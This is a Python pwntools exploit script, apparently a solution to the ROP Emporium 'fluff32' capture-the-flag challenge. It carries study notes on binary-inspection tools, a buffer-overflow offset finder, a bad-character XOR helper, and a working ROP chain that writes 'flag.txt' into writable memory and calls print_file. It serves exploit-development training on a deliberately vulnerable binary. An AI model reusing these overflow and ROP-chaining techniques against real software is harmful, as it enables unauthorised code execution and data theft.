from pwn import *

"""
How to:
    Unknown register???
        Check here and keep in mind that anything below 32 means the last x (16,8,4) bits
        https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture

    Check the file for security features
        checksec --file=<binary>                            #Check the security on the binary

    Check the binary for interesting things    
        rabin2 -qs <binary>                                 #Functions inside of the binary
        rabin2 -i <binary>                                  #Imported functions and where they are located
        rabin2 -z <binary>                                  #Programmer specific strings
        objdump -D <binary>                                 #Disassembles everything on the binary
        readelf -S <binary>                                 #Show section headers with information 
       
    Python things:
        cyclic(100, alphabet='bcdef')                                   #alphabet arg is useful for bad characters
        python3 -c 'from pwn import *; print(hexdump("agx."))'          #Prints hex of string in usual hex format
        python3 -c 'from pwn import *; print(enhex(b"agx."))'           #Prints hex of string in copy friendly format
        python3 -c 'from pwn import *; print(p32(0x80483d0))'           #Prints the x32 address in little endian
        python3 -c 'from pwn import *; print(p64(0x0000000000400693))'  #Prints the x64 address in little endian

    Inside of gdb:
        info functions                                      #Shows the functions
        disas <function>                                    #Shows the assembly for the function specified
        p <string>                                          #Grabs the address of the specified object
        search "<string>"                                   #Search for a string and show its address
        jump <function or *Address>                         #Jumps to function or address
        b <function or *Address>                            #Sets up a breakpoint
        More into the potatos (32):
            pattern create <#> {output file}                #Creates a pattern for finding offset
            pattern offset <#>                              #Finds the offset mentioned
     
    64Bit differences:
        Need to grab the RSP beginning instead  
        If the address is only 4 bytes, pad to 8 
        ropper -f <binary>                                  #Shows all rop gadgets in a binary
        ropper -f <binary> --search "pop rdi"               #Shows all rop gadgets that can pop RDI (For system calls, you need to have the target in RDI)
        ***For 64 Bit, try popping rdi at final function***
        ***For 64 Bit, Gadget -> Variables -> Location***
            Example
                print('A'*40 + '\xc3\x07\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x60\x05\x40\x00\x00\x00\x00\x00')
                      Buffer ->           POP RDI call            ->     What is going into RDI        ->          System()
        For printing, use the actual location vs 32's arg
            0x08048538 <+14>:    call   0x80483d0 <print_file@plt>
            64Bit                       32Bit

    ARMv5 difference:
        EIP/RIP is now PC
        POP r#, pc is the Arm equiv for the pop rdi
        
    MIPS difference:
        EIP/RIP/PC is now ra
        GDB doesn't like it so you can't use it      #Requires manual checking along with exploit dev
        
"""

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Bad Char finder
def bad_chars(string, badchars):
    # State check
    clear = False
    # Number to do XOR with. Start with 0 just in case base string is ok
    value_to_xor_with = 0
    
    # Key reason for function is that it will go to the next number as soon as it finds a bad character. 
    # It doesn't care if only 1 is found
    while not clear:
        # XOR process
        xored_string = xor(string, value_to_xor_with)
        # Verify bad characters are not in string
        for x in badchars:
            # A bad character was found
            if x in str(xored_string):
                clear = False
                value_to_xor_with += 1
                break

            # A bad character was not found
            if x not in str(xored_string):
                clear = True  

    # Print success and value
    info("XOR key found without bad characters: {}".format(value_to_xor_with))
    return value_to_xor_with, xored_string 


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './fluff32'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'info'
# Deletes core files if used
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Display what the program reports as bad characters
# print(str(io.recvline_contains("badchars are")))

# Grab function symbols
data_section_address = 0x0804a018
xchg_ecx_dl = 0x08048555
bswap_ecx = 0x08048558
pext_edx = 0x08048543
print_file = 0x80483d0
pop_ebp = 0x080485bb 
# pop_rdi = 0x0000000000400693

# Print out target addresses
info("%#x data_section_address", data_section_address)
info("%#x xchg_ecx_dl", xchg_ecx_dl)
info("%#x bswap_ecx", bswap_ecx)
info("%#x print_file", print_file)
info("%#x pext_edx", pext_edx)
info("%#x pop_ebp", pop_ebp)
# info("%#x pop_rdi", pop_rdi)

# Find Buffer overflow
payload = cyclic(100)

# Send payload
io.sendlineafter("> ", payload)

# Wait for crash
io.wait()

# Displaying what the bits for the program is
info("Running offset check for {} Bits".format(context.bits))

# Read the crash file
core = io.corefile

# Locate for 64 bits
if context.bits == 64:
    # Locate RIP value and offset
    stack = core.rsp
    # Looks for the first 4 characters of the rsp to find the offset for RIP
    pattern = core.read(stack,4)
    # Finds RIP offset with pattern
    offset = cyclic_find(pattern)
    # Display offset
    info("Located RIP at {a}".format(a=offset))

# Locate for 32 bits
elif context.bits == 32:
    # Locate EIP value and offset
    eip_value = core.eip
    offset = cyclic_find(eip_value)
    # Display offset
    info("Located EIP at {a}".format(a=offset))

# Use find_mask.py... It is a very next level script
full_mask = [0xb4b, 0x2dd, 0x1d46, 0xb5a, 0x1db, 0xacd, 0x1ac5, 0xacd]
# Holds the exploit
fluff_exploit = b""

for data_section_offset, mask in enumerate(full_mask):
    # Pops mask byte into ebp
    fluff_exploit += pack(pop_ebp)
    fluff_exploit += pack(mask)
    # Does pext and places output into edx (dl)
    fluff_exploit += pack(pext_edx)
    # Pops data section address offset to ecx (does bswap to switch endianness)
    fluff_exploit += pack(bswap_ecx)
    fluff_exploit += pack(data_section_address + data_section_offset, endian='big')
    # Exchanges the byte in edx (dl) with the byte pointed to ecx (Dataset offset)
    fluff_exploit += pack(xchg_ecx_dl)

# Build the payload
payload = flat({
    offset: [ fluff_exploit,    #Writes the next level exploit
    print_file,                 #Print file call
    0x0,                        #Null to make it happy
    data_section_address        #Location of flag.txt
    ]
})
print(str(payload))

# Save the payload to file
write('payload', payload)

# Start the process again
io = start()

# Send the payload
io.sendlineafter('> ', payload)
io.recvuntil('Thank you!\n')

# Or, Get our flag!
flag = io.recv()

try:
    success(flag)
except AttributeError:
    print("[+] Flag: {}".format(str(flag)))


'''
# Where to start?
    Find a location to write
        readelf -S badchars32
    Find the gadgets to write into something
        gdb fluff32
        disas questionableGadgets
            0x08048555 <+18>:    xchg   %dl,(%ecx)
    Find something that pops edx into ecx
        ropper -f fluff32 --search pop
            0x08048558: pop ecx; bswap ecx; ret; 
    Find something that writes into edx
        ropper -f fluff32 --search mov
            0x08048543: mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret; 
            wtf does this mean???
                You control ebp. Your values are compared against b0bababa. deadbeef is not used
    Find something that writes into ebp
        ropper -f fluff32 --search pop
            0x080485bb: pop ebp; ret; 
    Find mask values to insert into ebp to make it output flag.txt
        python3 pext_find_mask.py
    bswap ecx (write location + offset in Big endian)
        pack(data_section_address + data_section_offset, endian='big')
    Loop through all mask characters (flag.txt)
        for data_section_offset, mask in enumerate(full_mask):


# Attack Order
    pop_ebp
    mask
    pext_edx
    bswap_ecx
    data_section_address + data_section_offset, endian='big'
    xchg_ecx_dl

    fluff_exploit
    print_file
    0x0
    data_section_address

# How do you know what to do???
    data_section_address = 0x0804a018
        readelf -S badchars32
            [Nr] Name              Type             Address           Offset        Size              EntSize          Flags  Link  Info  Align
            [24] .data             PROGBITS         0804a018          001018        000008            00               WA     0     0     4

            Addr is what I need
            Size is how much I can write
            **W flag means I can write to it**
    
    xchg_ecx_dl = 0x08048555
        gdb fluff32
        disas questionableGadgets
            0x08048555 <+18>:    xchg   %dl,(%ecx)
            I now need something that pops edx into ecx
    
    bswap_ecx = 0x08048558
        ropper -f fluff32 --search pop
            0x08048558: pop ecx; bswap ecx; ret; 

    pext_edx = 0x08048543
        ropper -f fluff32 --search mov
            0x08048543: mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret; 
            wtf does this mean???
                You control ebp. Your values are compared against b0bababa. deadbeef is not used

    pop_ebp = 0x080485bb 
        ropper -f fluff32 --search pop
            0x080485bb: pop ebp; ret; 

    print_file = 0x08048538
        gdb fluff32
        disas usefulFunctions
            0x08048538 <+14>:    call   0x80483d0 <print_file@plt>

   
# Manual Exploitation
XORing makes manual exploitation crafting impractical...
'''
